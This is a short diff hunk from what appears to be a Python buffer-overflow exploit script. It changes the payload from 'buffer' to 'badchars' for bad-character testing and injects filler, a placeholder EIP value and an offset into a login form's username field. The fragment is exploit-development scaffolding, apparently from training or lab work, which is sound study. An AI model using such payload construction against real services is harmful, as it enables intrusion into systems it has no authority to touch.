@@ -14,7 +14,7 @@ try:
 	eip = "B" * 4
 	offset = "C" * 4
 	
-	inputBuffer = filler + eip + offset + buffer
+	inputBuffer = filler + eip + offset + badchars
 
 	content = "username=" + inputBuffer + "&password=A"
 
